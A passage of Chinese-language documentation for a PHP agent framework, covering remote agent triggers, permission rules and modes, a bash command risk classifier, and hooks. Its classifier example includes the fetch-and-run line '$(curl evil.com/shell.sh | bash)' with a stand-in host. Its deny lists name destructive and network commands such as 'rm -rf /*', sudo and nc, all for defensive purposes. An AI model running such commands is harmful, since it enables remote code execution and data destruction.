远程 agent 系统支持在 Anthropic 的基础设施（或兼容 API）上运行 SuperAgent 任务，无需保持本地会话存活。它包含：

- **`RemoteAgentTask`** -- 表示触发器的值对象，包含 ID、名称、cron 表达式、作业配置、状态和 MCP 连接。
- **`RemoteAgentManager`** -- 通过 `/v1/code/triggers` 端点创建、列出、获取、更新、运行和删除触发器的 API 客户端。
- **`RemoteTriggerTool`** -- 用于在对话中触发远程工作流的内置工具。
- **`ScheduleCronTool`** -- 用于在对话中调度基于 cron 的任务的内置工具。

远程 agent 使用 `ccr`（Claude Code Remote）作业格式并支持：
- 自定义模型选择（默认：`claude-sonnet-4-6`）
- 可配置的工具白名单
- Git 仓库来源
- MCP 服务器连接
- 自动时区转 UTC 的 cron 调度

### 配置

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiBaseUrl: 'https://api.anthropic.com',  // 或自定义端点
    apiKey: env('ANTHROPIC_API_KEY'),
    organizationId: env('ANTHROPIC_ORG_ID'),  // 可选
);
```

该 API 使用 `anthropic-beta: ccr-triggers-2026-01-30` 头部用于触发器 API。

#### 默认允许的工具

远程 agent 默认获得这些工具：`Bash`、`Read`、`Write`、`Edit`、`Glob`、`Grep`。

### 用法

#### 创建触发器

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiKey: getenv('ANTHROPIC_API_KEY'),
);

// 创建一次性触发器（无 cron）
$trigger = $manager->create(
    name: '每日代码审查',
    prompt: '审查过去 24 小时内打开的所有 PR 并留下评论。',
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/my-repo.git',
);

echo $trigger->id;      // 'trig_abc123'
echo $trigger->status;  // 'idle'
```

#### 使用 cron 调度

```php
// 创建一个在工作日每天上午 9 点 UTC 运行的触发器
$trigger = $manager->create(
    name: '晨间依赖检查',
    prompt: '检查过时的依赖并为关键更新创建 issue。',
    cronExpression: '0 9 * * 1-5',  // UTC
);

// 将本地时区转换为 UTC
$utcCron = RemoteAgentManager::cronToUtc('0 9 * * 1-5', 'America/New_York');
// '0 14 * * 1-5'（EST 为 UTC-5）

$trigger = $manager->create(
    name: '晚间报告',
    prompt: '生成每日状态报告。',
    cronExpression: $utcCron,
);
```

#### 带 MCP 连接

```php
$trigger = $manager->create(
    name: '数据库健康检查',
    prompt: '使用数据库 MCP 服务器检查表大小和索引健康状况。',
    mcpConnections: [
        [
            'name' => 'postgres-mcp',
            'type' => 'http',
            'url' => 'https://mcp.internal.example.com/postgres',
        ],
    ],
);
```

#### 管理触发器

```php
// 列出所有触发器
$triggers = $manager->list();
foreach ($triggers as $trigger) {
    echo "{$trigger->name} ({$trigger->id}): {$trigger->status}\n";
    if ($trigger->cronExpression) {
        echo "  Cron: {$trigger->cronExpression}\n";
    }
    if ($trigger->lastRunAt) {
        echo "  上次运行: {$trigger->lastRunAt}\n";
    }
}

// 获取特定触发器
$trigger = $manager->get('trig_abc123');

// 更新触发器
$updated = $manager->update('trig_abc123', [
    'enabled' => false,
    'cron_expression' => '0 10 * * 1-5',  // 改为上午 10 点
]);

// 立即运行触发器（绕过 cron 调度）
$runResult = $manager->run('trig_abc123');

// 删除触发器
$manager->delete('trig_abc123');
```

#### 使用内置工具

`RemoteTriggerTool` 和 `ScheduleCronTool` 作为内置工具可供 LLM 在对话中调用：

```php
use SuperAgent\Tools\Builtin\RemoteTriggerTool;
use SuperAgent\Tools\Builtin\ScheduleCronTool;

$remoteTrigger = new RemoteTriggerTool();
$result = $remoteTrigger->execute([
    'action' => 'create',
    'data' => [
        'name' => '每周清理',
        'prompt' => '清理过时的分支。',
    ],
]);

$cronTool = new ScheduleCronTool();
$result = $cronTool->execute([
    'action' => 'create',
    'data' => [
        'name' => '夜间测试',
        'cron' => '0 2 * * *',
    ],
]);
```

### API 参考

#### `RemoteAgentTask`

| 属性 | 类型 | 描述 |
|----------|------|-------------|
| `id` | `string` | 唯一触发器 ID |
| `name` | `string` | 人类可读的名称 |
| `cronExpression` | `?string` | Cron 表达式（UTC） |
| `enabled` | `bool` | 触发器是否激活 |
| `taskType` | `string` | 任务类型（默认：`remote-agent`） |
| `jobConfig` | `array` | 完整的 CCR 作业配置 |
| `status` | `string` | 当前状态（`idle`、`running` 等） |
| `createdAt` | `?string` | 创建时间戳 |
| `lastRunAt` | `?string` | 上次执行时间戳 |
| `mcpConnections` | `array` | MCP 服务器连接 |

| 方法 | 描述 |
|--------|-------------|
| `fromArray(array $data)` | （静态）从 API 响应创建 |
| `toArray()` | 序列化为数组 |

#### `RemoteAgentManager`

| 方法 | 返回值 | 描述 |
|--------|---------|-------------|
| `create(name, prompt, cron?, model?, tools?, gitUrl?, mcp?)` | `RemoteAgentTask` | 创建触发器 |
| `list()` | `RemoteAgentTask[]` | 列出所有触发器 |
| `get(triggerId)` | `RemoteAgentTask` | 按 ID 获取触发器 |
| `update(triggerId, updates)` | `RemoteAgentTask` | 更新触发器配置 |
| `run(triggerId)` | `array` | 立即运行触发器 |
| `delete(triggerId)` | `bool` | 删除触发器 |
| `cronToUtc(localCron, timezone)` | `string` | （静态）将 cron 转换为 UTC |

#### `RemoteTriggerTool`

| 属性 | 值 |
|----------|-------|
| 名称 | `RemoteTriggerTool` |
| 类别 | `automation` |
| 输入 | `action` (string), `data` (object) |
| 只读 | 否 |

#### `ScheduleCronTool`

| 属性 | 值 |
|----------|-------|
| 名称 | `ScheduleCronTool` |
| 类别 | `automation` |
| 输入 | `action` (string), `data` (object) |
| 只读 | 否 |

### 示例

#### 完整触发器生命周期

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(apiKey: getenv('ANTHROPIC_API_KEY'));

// 创建
$trigger = $manager->create(
    name: 'PR 审查机器人',
    prompt: '审查所有打开的 PR。对每个 PR，检查代码质量、测试覆盖率，并留下建设性评论。',
    cronExpression: '0 8 * * 1-5',  // 工作日上午 8 点 UTC
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/backend.git',
);

echo "已创建触发器: {$trigger->id}\n";

// 立即测试
$result = $manager->run($trigger->id);
echo "运行结果: " . json_encode($result) . "\n";

// 检查状态
$updated = $manager->get($trigger->id);
echo "状态: {$updated->status}\n";
echo "上次运行: {$updated->lastRunAt}\n";

// 维护期间禁用
$manager->update($trigger->id, ['enabled' => false]);

// 重新启用
$manager->update($trigger->id, ['enabled' => true]);

// 清理
$manager->delete($trigger->id);
```

#### 时区转换

```php
use SuperAgent\Remote\RemoteAgentManager;

// 将"东部时间上午 9 点"转换为 UTC cron
$utc = RemoteAgentManager::cronToUtc('0 9 * * *', 'America/New_York');
// 结果: '0 14 * * *'（EST 期间，UTC-5）

// 东京下午 3 点每日
$utc = RemoteAgentManager::cronToUtc('0 15 * * *', 'Asia/Tokyo');
// 结果: '0 6 * * *'（JST 为 UTC+9）
```

### 故障排除

| 问题 | 原因 | 解决方案 |
|---------|-------|----------|
| "Remote API error (401)" | 无效的 API 密钥 | 检查 `ANTHROPIC_API_KEY` |
| "Remote API error (403)" | 缺少组织 ID 或权限不足 | 设置 `organizationId` 参数 |
| 触发器未运行 | `enabled` 为 false | 更新触发器为 `['enabled' => true]` |
| Cron 调度偏差几小时 | 时区未转换 | 使用 `cronToUtc()` 转换本地时间 |
| MCP 连接失败 | MCP 服务器从远程不可访问 | 确保 MCP 服务器有公共端点 |
| 非标准 cron 被拒绝 | 无效的 cron 表达式 | 使用标准 5 字段 cron（分 时 日 月 周） |

---

## 4. 权限系统

> 通过 6 种权限模式、可配置规则、bash 命令分类以及与护栏规则和 Hook 的集成来控制 agent 可以执行的工具和命令。

### 概述

权限系统是每次工具调用的守门人。它评估一个多步决策流水线，检查拒绝规则、护栏规则、bash 安全分类、工具特定逻辑和基于模式的策略。结果始终是三种行为之一：**允许**、**拒绝**或**询问**（提示用户）。

核心类：

| 类 | 角色 |
|---|---|
| `PermissionEngine` | 具有 6 步评估流水线的中央决策引擎 |
| `PermissionMode` | 6 种权限模式的枚举 |
| `PermissionRule` | 具有工具名称和内容模式的单个允许/拒绝/询问规则 |
| `PermissionRuleParser` | 将规则字符串（如 `Bash(git *)`）解析为 `PermissionRuleValue` |
| `PermissionRuleValue` | 解析后的规则：工具名称 + 可选内容模式 |
| `BashCommandClassifier` | 按风险级别和类别对 bash 命令进行分类 |
| `PermissionDecision` | 结果：允许/拒绝/询问，附带原因和建议 |
| `PermissionDenialTracker` | 跟踪拒绝历史以用于分析 |

### 权限模式

系统支持 6 种模式来确定整体权限策略：

| 模式 | 枚举值 | 行为 |
|---|---|---|
| **默认** | `default` | 标准规则适用；未匹配的操作提示用户 |
| **计划** | `plan` | 即使允许的操作也需要明确批准 |
| **接受编辑** | `acceptEdits` | 自动允许文件编辑工具（Edit, MultiEdit, Write, NotebookEdit） |
| **绕过权限** | `bypassPermissions` | 自动允许一切（危险） |
| **不询问** | `dontAsk` | 从不提示；自动拒绝任何本应"询问"的操作 |
| **自动** | `auto` | 使用自动分类器决定"询问"操作的允许/拒绝 |

```php
use SuperAgent\Permissions\PermissionMode;

$mode = PermissionMode::DEFAULT;
echo $mode->getTitle();   // "Standard Permissions"
echo $mode->getSymbol();  // 锁图标
echo $mode->getColor();   // "green"
echo $mode->isHeadless(); // false（仅 DONT_ASK 和 AUTO 是无头的）
```

### 配置

#### 设置中的权限规则

规则在 `settings.json` 中通过三个列表配置：

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(npm test*)",
      "Read",
      "Glob",
      "Grep"
    ],
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(sudo *)",
      "Write(.env*)"
    ],
    "ask": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### 规则语法

规则遵循 `ToolName` 或 `ToolName(content-pattern)` 格式：

| 规则 | 匹配 |
|---|---|
| `Bash` | 所有 Bash 工具调用 |
| `Bash(git status*)` | 以 `git status` 开头的 Bash 命令 |
| `Bash(npm install*)` | 以 `npm install` 开头的 Bash 命令 |
| `Read` | 所有 Read 工具调用 |
| `Write(.env*)` | 对以 `.env` 开头的文件的 Write 调用 |
| `Edit(/etc/*)` | 对以 `/etc/` 开头的文件的 Edit 调用 |

通配符：尾部的 `*` 匹配任意后缀（前缀匹配）。没有 `*` 时，规则要求完全匹配。

特殊字符 `(`、`)` 和 `\` 可以用反斜杠转义。

```php
use SuperAgent\Permissions\PermissionRuleParser;
use SuperAgent\Permissions\PermissionRuleValue;

$parser = new PermissionRuleParser();

$rule = $parser->parse('Bash(git status*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'git status*'

$rule = $parser->parse('Read');
// $rule->toolName === 'Read'
// $rule->ruleContent === null（匹配所有 Read 调用）

$rule = $parser->parse('Bash(npm install*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'npm install*'
```

#### PermissionRule 匹配

```php
use SuperAgent\Permissions\PermissionRule;
use SuperAgent\Permissions\PermissionRuleSource;
use SuperAgent\Permissions\PermissionBehavior;
use SuperAgent\Permissions\PermissionRuleValue;

$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Bash', 'git *'),
);

$rule->matches('Bash', 'git status');       // true
$rule->matches('Bash', 'git push origin');  // true
$rule->matches('Bash', 'npm install');      // false
$rule->matches('Read', 'file.txt');         // false

// 没有内容模式的规则匹配该工具的所有调用
$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Read'),
);

$rule->matches('Read', '/any/file.txt');    // true
$rule->matches('Read', null);               // true
```

### 用法

#### 创建 PermissionEngine

```php
use SuperAgent\Permissions\PermissionEngine;
use SuperAgent\Permissions\PermissionContext;
use SuperAgent\Permissions\PermissionMode;

$context = new PermissionContext(
    mode: PermissionMode::DEFAULT,
    alwaysAllowRules: $allowRules,   // PermissionRule[]
    alwaysDenyRules: $denyRules,     // PermissionRule[]
    alwaysAskRules: $askRules,       // PermissionRule[]
);

$engine = new PermissionEngine(
    callback: $permissionCallback,    // PermissionCallbackInterface
    context: $context,
    guardrailsEngine: $guardrailsEngine, // 可选
);
```

#### 检查权限

```php
$decision = $engine->checkPermission($tool, $input);

switch ($decision->behavior) {
    case PermissionBehavior::ALLOW:
        // 执行工具
        break;

    case PermissionBehavior::DENY:
        echo "已拒绝: {$decision->message}\n";
        echo "原因: {$decision->reason->type}\n";
        break;

    case PermissionBehavior::ASK:
        // 显示权限提示及建议
        echo "需要权限: {$decision->message}\n";
        foreach ($decision->suggestions as $suggestion) {
            echo "  - {$suggestion->label}\n";
        }
        break;
}
```

### 决策流水线

`PermissionEngine::checkPermission()` 方法遵循 6 步评估流水线：

#### 第 1 步：基于规则的权限（不可绕过）

先检查拒绝规则，再检查询问规则。这些不能被任何模式覆盖。

- **拒绝规则**：匹配时立即返回 `deny`
- **询问规则**：匹配时返回 `ask`
- **危险路径**：检查敏感路径（`.git/`、`.env`、`.ssh/`、`credentials`、`/etc/` 等）

#### 第 1.5 步：护栏规则 DSL 评估

如果配置了 `GuardrailsEngine`，将根据 `RuntimeContext` 评估护栏规则。映射到权限操作（`deny`、`allow`、`ask`）的护栏结果被使用；非权限操作（`warn`、`log`、`downgrade_model`）会透传。

#### 第 2 步：Bash 命令分类

对于 Bash 工具调用（当 `bash_classifier` 实验功能启用时），`BashCommandClassifier` 评估命令：

- **严重/高风险**：返回带风险原因的 `ask`
- **需要批准**：在非绕过模式下返回 `ask`
- **低风险**：透传（不自动允许）

#### 第 3 步：工具交互要求

如果工具声明了 `requiresUserInteraction()`，返回 `ask`。

#### 第 4 步：基于模式的允许

- **绕过模式**：所有操作返回 `allow`
- **接受编辑模式**：编辑工具（Edit, MultiEdit, Write, NotebookEdit）返回 `allow`

#### 第 5 步：允许规则

检查允许规则列表。匹配时返回 `allow`。

#### 第 6 步：默认

如果没有其他匹配，返回附带生成建议的 `ask`。

#### 模式转换

流水线产生决策后，应用模式特定的转换：

| 模式 | 转换 |
|---|---|
| **不询问** | `ask` 决策变为 `deny`（自动拒绝） |
| **计划** | `allow` 决策变为 `ask`（需要明确批准） |
| **自动** | `ask` 决策路由到自动分类器，返回 `allow` 或 `deny` |

### Bash 命令分类

`BashCommandClassifier` 分两个阶段分析 shell 命令：

#### 阶段 1：安全验证器（23 项检查）

`BashSecurityValidator` 执行 23 项注入和混淆检查。如果任何检查失败，命令被分类为 `critical` 风险，类别为 `security`。

#### 阶段 2：命令分析

| 风险级别 | 类别 | 示例 |
|---|---|---|
| **严重** | `security`, `destructive`, `privilege` | 安全违规, `dd`, `mkfs`, `sudo`, `su` |
| **高** | `destructive`, `permission`, `process`, `network`, `complex`, `dangerous-pattern` | `rm`, `chmod`, `chown`, `kill`, `nc`, 命令替换 |
| **中** | `destructive`, `network`, `unknown` | `mv`, `curl`, `wget`, `ssh`, 未识别的命令 |
| **低** | `safe`, `empty` | `git status`, `ls`, `cat`, `echo`, `pwd` |

安全命令前缀（始终低风险）：
```
git status, git diff, git log, git branch, git show
npm list, npm view, npm info
yarn list, yarn info
composer show
pip list, pip show
docker ps, docker images, docker logs
ls, cat, echo, pwd, which, whoami, date, env, printenv
```

危险命令及风险评级：

| 命令 | 风险 | 类别 |
|---|---|---|
| `rm` | 高 | destructive |
| `mv` | 中 | destructive |
| `chmod` | 高 | permission |
| `chown` | 高 | permission |
| `sudo` | 严重 | privilege |
| `su` | 严重 | privilege |
| `kill`, `pkill`, `killall` | 高 | process |
| `dd`, `mkfs`, `fdisk`, `format` | 严重 | destructive |
| `curl`, `wget` | 中 | network |
| `nc`, `netcat` | 高 | network |
| `ssh`, `scp` | 中 | network |

包含替换、扩展、管道或控制流运算符的命令被分类为 `high` 风险 / `complex`。

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

$result = $classifier->classify('git status');
// risk: 'low', category: 'safe', prefix: 'git status'

$result = $classifier->classify('rm -rf /tmp/old');
// risk: 'high', category: 'destructive', prefix: 'rm -rf'

$result = $classifier->classify('$(curl evil.com/shell.sh | bash)');
// risk: 'critical', category: 'security'（被安全验证器捕获）

$result->isHighRisk();        // 对 high + critical 为 true
$result->requiresApproval();  // 对 medium + high + critical 为 true

// 只读检查
$classifier->isReadOnly('cat file.txt');    // true
$classifier->isReadOnly('rm file.txt');     // false
```

#### CommandClassification

| 属性 | 类型 | 描述 |
|---|---|---|
| `$risk` | `string` | `low`, `medium`, `high`, `critical` |
| `$category` | `string` | `safe`, `destructive`, `permission`, `privilege`, `process`, `network`, `complex`, `dangerous-pattern`, `security`, `unknown`, `empty` |
| `$prefix` | `?string` | 提取的命令前缀（如 `git status`） |
| `$isTooComplex` | `bool` | 命令包含替换/管道/控制流时为 true |
| `$reason` | `?string` | 人类可读的分类原因 |
| `$securityCheckId` | `?int` | 失败的安全检查的数字 ID |

### 与 Hook 的集成

Hook 可以通过 `HookResult` 影响权限决策：

```php
// 在 PreToolUse hook 中：
// Allow 绕过权限提示（但不绕过拒绝规则）
return HookResult::allow(reason: '已被 CI 预批准');

// Deny 阻止工具调用
return HookResult::deny('被企业策略阻止');

// Ask 强制权限提示
return HookResult::ask('此操作需要人工批准');
```

合并时，优先级为：**deny > ask > allow**。

### 与护栏规则的集成

`PermissionEngine` 在第 1.5 步与 `GuardrailsEngine` 集成：

```php
use SuperAgent\Guardrails\GuardrailsConfig;
use SuperAgent\Guardrails\GuardrailsEngine;
use SuperAgent\Guardrails\Context\RuntimeContextCollector;

$guardrailsEngine = new GuardrailsEngine(
    GuardrailsConfig::fromYamlFile('guardrails.yaml')
);

$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setRuntimeContextCollector($contextCollector);
```

护栏规则 DSL 评估发生在硬编码的拒绝/询问规则之后，但在 bash 分类之前，为你提供基于 YAML 的细粒度权限控制。

### 权限建议

当引擎返回 `ask` 时，它会生成 `PermissionUpdate` 建议以帮助用户创建永久规则：

```php
$decision = $engine->checkPermission($tool, $input);

foreach ($decision->suggestions as $suggestion) {
    echo "{$suggestion->label}\n";
    // 示例：
    // "允许此特定操作"
    // "允许 'git' 命令"
    // "允许所有 Bash 操作"
    // "进入绕过模式（危险）"
}
```

建议包括：
1. 允许精确操作（完整内容匹配）
2. 允许带通配符的命令前缀
3. 允许该工具的所有调用
4. 进入绕过模式

### API 参考

#### `PermissionEngine`

| 方法 | 描述 |
|---|---|
| `__construct(PermissionCallbackInterface $callback, PermissionContext $context, ?GuardrailsEngine $guardrailsEngine)` | 创建引擎 |
| `checkPermission(Tool $tool, array $input): PermissionDecision` | 评估工具调用的权限 |
| `getContext(): PermissionContext` | 获取当前上下文 |
| `setContext(PermissionContext $context): void` | 更新上下文（如更改模式） |
| `setGuardrailsEngine(?GuardrailsEngine $engine): void` | 设置/取消护栏规则集成 |
| `setRuntimeContextCollector(?RuntimeContextCollector $collector): void` | 设置护栏规则的上下文收集器 |
| `getDenialTracker(): PermissionDenialTracker` | 获取拒绝跟踪历史 |

#### `PermissionMode`（枚举）

| 情况 | 值 | 无头？ | 描述 |
|---|---|---|---|
| `DEFAULT` | `default` | 否 | 标准权限规则 |
| `PLAN` | `plan` | 否 | 所有操作需要明确批准 |
| `ACCEPT_EDITS` | `acceptEdits` | 否 | 自动允许文件编辑工具 |
| `BYPASS_PERMISSIONS` | `bypassPermissions` | 否 | 自动允许一切 |
| `DONT_ASK` | `dontAsk` | 是 | 自动拒绝任何会提示的操作 |
| `AUTO` | `auto` | 是 | 使用自动分类器做决策 |

#### `PermissionRule`

| 方法 | 描述 |
|---|---|
| `matches(string $toolName, ?string $content): bool` | 检查规则是否匹配工具调用 |
| `toString(): string` | 字符串表示 |

#### `PermissionRuleParser`

| 方法 | 描述 |
|---|---|
| `parse(string $rule): PermissionRuleValue` | 将规则字符串解析为工具名称 + 内容模式 |

#### `BashCommandClassifier`

| 方法 | 描述 |
|---|---|
| `classify(string $command): CommandClassification` | 对 bash 命令进行分类 |
| `isReadOnly(string $command): bool` | 检查命令是否为只读 |

### 示例

#### 典型项目配置

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(git branch*)",
      "Bash(npm test*)",
      "Bash(npm run lint*)",
      "Bash(composer test*)",
      "Bash(php artisan test*)",
      "Bash(ls *)",
      "Bash(cat *)",
      "Bash(pwd)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)",
      "Bash(chmod 777*)",
      "Write(.env*)",
      "Write(credentials*)"
    ],
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)",
      "Bash(npm publish*)",
      "Bash(curl *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### CI/CD 无头配置

```json
{
  "permissions": {
    "mode": "dontAsk",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Write",
      "Edit",
      "Bash(git *)",
      "Bash(npm *)",
      "Bash(composer *)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)"
    ]
  }
}
```

### 故障排除

**工具总是被拒绝** -- 先检查拒绝规则；它们不可绕过，在其他一切之前评估。还要检查 `dontAsk` 模式是否激活（将所有 `ask` 转为 `deny`）。

**工具总是提示** -- 在 `plan` 模式下，即使允许的操作也变为 `ask`。用 `$engine->getContext()->mode` 检查当前模式。

**Bash 命令分类错误** -- 分类器将任何包含 `$()`、反引号、管道、`&&`、`||` 或 `;` 的命令视为"过于复杂"并分配 `high` 风险。这是为了安全而有意为之。

**护栏规则未被评估** -- 必须同时设置 `setGuardrailsEngine()` 和 `setRuntimeContextCollector()` 才能让护栏规则参与决策流水线。

**权限建议未出现** -- 建议仅为 `ask` 决策生成。`allow` 和 `deny` 决策不包含建议。

**"Empty permission rule" 错误** -- 传递给 `PermissionRuleParser::parse()` 的规则字符串为空或仅有空白。

---

## 5. Hook（钩子）系统

> 在每个阶段拦截和控制 agent 行为 -- 从工具执行到会话生命周期 -- 使用可组合、可配置的 Hook，可以允许、拒绝、修改或观察操作。

### 概述

Hook 系统为拦截 agent 事件提供了类似中间件的流水线。Hook 按事件类型组织，并使用与权限系统相同的规则语法匹配工具名称。每个 Hook 产生一个 `HookResult`，可以继续执行、停止执行、修改工具输入、注入系统消息或控制权限行为。

核心类：

| 类 | 角色 |
|---|---|
| `HookRegistry` | 中央注册表：注册 Hook、为事件执行 Hook、管理生命周期 |
| `HookEvent` | 21 个可 Hook 事件的枚举 |
| `HookType` | Hook 实现类型的枚举（command, prompt, http, agent, callback, function） |
| `HookInput` | 传递给 Hook 的不可变输入载荷 |
| `HookResult` | Hook 执行结果，包含控制流指令 |
| `HookMatcher` | 使用权限规则语法将 Hook 匹配到工具调用 |
| `StopHooksPipeline` | OnStop/TaskCompleted/TeammateIdle Hook 的专用流水线 |

### Hook 事件

#### 生命周期事件

| 事件 | 值 | 描述 |
|---|---|---|
| `SessionStart` | `SessionStart` | 新会话开始时触发 |
| `SessionEnd` | `SessionEnd` | 会话结束时触发 |
| `OnStop` | `OnStop` | agent 停止时触发 |
| `OnQuery` | `OnQuery` | 收到查询时触发 |
| `OnMessage` | `OnMessage` | 收到消息时触发 |
| `OnThinkingComplete` | `OnThinkingComplete` | 扩展思考完成时触发 |

#### 工具执行事件

| 事件 | 值 | 描述 |
|---|---|---|
| `PreToolUse` | `PreToolUse` | 工具执行前触发 |
| `PostToolUse` | `PostToolUse` | 工具成功执行后触发 |
| `PostToolUseFailure` | `PostToolUseFailure` | 工具执行失败时触发 |

#### 权限事件

| 事件 | 值 | 描述 |
|---|---|---|
| `PermissionRequest` | `PermissionRequest` | 请求权限时触发 |
| `PermissionDenied` | `PermissionDenied` | 权限被拒绝时触发 |

#### 用户交互事件

| 事件 | 值 | 描述 |
|---|---|---|
| `UserPromptSubmit` | `UserPromptSubmit` | 用户提交提示时触发 |
| `Notification` | `Notification` | 通用通知时触发 |

#### 系统事件

| 事件 | 值 | 描述 |
|---|---|---|
| `PreCompact` | `PreCompact` | 对话压缩前触发 |
| `PostCompact` | `PostCompact` | 对话压缩后触发 |
| `ConfigChange` | `ConfigChange` | 配置更改时触发 |

#### 任务事件

| 事件 | 值 | 描述 |
|---|---|---|
| `TaskCreated` | `TaskCreated` | 任务创建时触发 |
| `TaskCompleted` | `TaskCompleted` | 任务完成时触发 |

#### 队友事件

| 事件 | 值 | 描述 |
|---|---|---|
| `TeammateIdle` | `TeammateIdle` | 队友 agent 变为空闲时触发 |
| `SubagentStop` | `SubagentStop` | 子 agent 停止时触发 |

#### 文件系统事件

| 事件 | 值 | 描述 |
|---|---|---|
| `CwdChanged` | `CwdChanged` | 当前目录更改时触发 |
| `FileChanged` | `FileChanged` | 监控的文件更改时触发 |

### 配置

#### 设置 JSON 格式

Hook 在 `settings.json`（项目级 `.superagent/settings.json` 或用户级）中配置：

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "echo '即将运行 bash 命令'",
            "timeout": 10
          }
        ]
      },
      {
        "matcher": "Bash(git *)",
        "hooks": [
          {
            "type": "command",
            "command": "/usr/local/bin/validate-git-command.sh",
            "timeout": 30,
            "if": "tool_input.command contains 'push'"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "php-cs-fixer fix $TOOL_INPUT_FILE_PATH",
            "async": true
          }
        ]
      }
    ],
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "echo '会话已启动'",
            "once": true
          }
        ]
      }
    ]
  }
}
```

#### 从配置加载

```php
use SuperAgent\Hooks\HookRegistry;
use SuperAgent\Hooks\HookEvent;

$registry = new HookRegistry($logger);

// 从配置数组加载（通常从 settings.json 解析）
$registry->loadFromConfig($config['hooks'], 'my-plugin');
```

### 用法

#### 以编程方式注册 Hook

```php
use SuperAgent\Hooks\HookRegistry;
use SuperAgent\Hooks\HookEvent;
use SuperAgent\Hooks\HookMatcher;
use SuperAgent\Hooks\CommandHook;

$registry = new HookRegistry($logger);

// 为 Bash 的 PreToolUse 注册命令 Hook
$matcher = new HookMatcher(
    matcher: 'Bash',
    hooks: [
        new CommandHook(
            command: '/usr/local/bin/validate-command.sh',
            shell: 'bash',
            timeout: 30,
        ),
    ],
    pluginName: 'security-plugin',
);

$registry->register(HookEvent::PRE_TOOL_USE, $matcher);

// 注册匹配所有工具的 Hook（null 匹配器）
$globalMatcher = new HookMatcher(
    matcher: null,  // 匹配所有
    hooks: [/* ... */],
);

$registry->register(HookEvent::PRE_TOOL_USE, $globalMatcher);
```

#### 从配置数组

```php
// HookMatcher::fromConfig() 解析 settings.json 格式
$matcher = HookMatcher::fromConfig([
    'matcher' => 'Bash(git *)',
    'hooks' => [
        [
            'type' => 'command',
            'command' => '/usr/local/bin/validate-git.sh',
            'timeout' => 30,
            'async' => false,
            'once' => false,
            'if' => 'tool_input.command contains "push"',
            'statusMessage' => '正在验证 git 命令...',
        ],
        [
            'type' => 'http',
            'url' => 'https://hooks.example.com/validate',
            'headers' => ['Authorization' => 'Bearer {{env.HOOK_TOKEN}}'],
            'allowedEnvVars' => ['HOOK_TOKEN'],
            'timeout' => 10,
        ],
    ],
], 'my-plugin');

$registry->register(HookEvent::PRE_TOOL_USE, $matcher);
```

#### 执行 Hook

```php
use SuperAgent\Hooks\HookInput;
use SuperAgent\Hooks\HookEvent;

// 为 PreToolUse 事件创建输入
$input = HookInput::preToolUse(
    sessionId: $sessionId,
    cwd: getcwd(),
    toolName: 'Bash',
    toolInput: ['command' => 'git push origin main'],
    toolUseId: 'toolu_123',
    gitRepoRoot: '/path/to/repo',
);

// 执行所有匹配的 Hook
$result = $registry->executeHooks(HookEvent::PRE_TOOL_USE, $input);

// 检查结果
if (!$result->continue) {
    echo "Hook 停止了执行: {$result->stopReason}\n";
    return;
}

// 检查权限行为
if ($result->permissionBehavior === 'deny') {
    echo "Hook 拒绝: {$result->permissionReason}\n";
    return;
}

if ($result->permissionBehavior === 'allow') {
    // 无需权限提示继续
}

if ($result->permissionBehavior === 'ask') {
    // 向用户显示权限提示
    echo "Hook 需要批准: {$result->permissionReason}\n";
}

// 应用修改后的输入
if ($result->updatedInput !== null) {
    $toolInput = array_merge($toolInput, $result->updatedInput);
}

// 注入系统消息
if ($result->systemMessage !== null) {
    $conversation->addSystemMessage($result->systemMessage);
}
```

#### 便捷输入构造函数

```php
// PostToolUse
$input = HookInput::postToolUse(
    sessionId: $sessionId,
    cwd: getcwd(),
    toolName: 'Write',
    toolInput: ['file_path' => 'src/App.php', 'content' => '...'],
    toolUseId: 'toolu_456',
    toolOutput: '文件写入成功',
);

// SessionStart
$input = HookInput::sessionStart(
    sessionId: $sessionId,
    cwd: getcwd(),
    source: 'cli',
    agentType: 'main',
    model: 'claude-sonnet-4-20250514',
);

// FileChanged
$input = HookInput::fileChanged(
    sessionId: $sessionId,
    cwd: getcwd(),
    changedFiles: ['src/App.php', 'tests/AppTest.php'],
    watchPaths: ['src/', 'tests/'],
);
```

### HookResult 控制流

`HookResult` 携带指令，控制 Hook 执行后发生什么：

#### 静态构造函数

```php
use SuperAgent\Hooks\HookResult;

// 正常继续执行
$result = HookResult::continue();

// 继续并注入系统消息
$result = HookResult::continue(
    systemMessage: 'Hook 提醒：编辑后始终运行测试',
);

// 继续并修改工具输入
$result = HookResult::continue(
